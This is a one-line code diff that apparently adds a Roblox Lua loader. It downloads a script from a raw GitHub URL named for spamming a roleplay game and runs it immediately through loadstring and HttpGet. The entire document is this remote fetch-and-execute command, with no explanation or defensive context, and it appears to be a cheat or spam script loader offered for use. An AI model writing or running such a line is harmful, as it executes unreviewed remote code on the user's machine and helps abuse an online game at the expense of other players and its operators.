@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/lifetogether-rp-spam5-6395bys9gs8bdz.lua"))()
